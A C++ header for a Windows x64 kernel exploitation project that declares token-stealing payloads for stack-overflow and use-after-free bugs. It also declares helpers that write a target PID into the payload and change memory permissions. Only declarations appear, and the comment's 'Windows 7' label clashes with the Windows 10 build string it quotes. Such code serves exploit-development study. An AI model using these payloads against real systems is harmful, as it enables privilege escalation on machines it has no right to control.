#ifndef  __PAYLOAD_X64_H__
#define  __PAYLOAD_X64_H__

#include "windows.h"
#include <tlhelp32.h>  // CreateToolhelp32Snapshot

extern "C" {
	/*!!!
	Payloads only for the following OS:
	Windows 7 Kernel Version 15063 MP (1 procs) Free x64
	Product: WinNt, suite: TerminalServer SingleUserTS
	Built by: 15063.0.amd64fre.rs2_release.170317-1834
	*/

	void TokenStealingPayloadStackOverflow();

	void TokenStealingPayloadUAF();
}

namespace payloads{

	const DWORD g_dwDefaultPid = 0xDDAABBEE;
	const byte g_bDefaultPid[] = "\xEE\xBB\xAA\xDD"; // g_bDefaultPid = 0DDAABBEEh

	// we calculate 'func_addr' via disassembling instruction [JMP ADDR]
	extern byte* _funcAddr; 
	
	// we calculate 'pid_offset' via searching 'g_bDefaultPid' signature
	extern DWORD _pidOffset;

	 /* check if a process with PID is running */
	bool process_is_running(const DWORD targetPid);

	typedef void(*PAYLOAD_FUNC)();

	/* write '_targetPid' into the payload */
	bool set_pid_to_payload(const DWORD targetPid, const PAYLOAD_FUNC payloadFunc);

	/* set memory permission for '_funcAddr' memory*/
	bool set_memory_permission(const DWORD flNewProtect);
}

#endif // __PAYLOAD_X64_H__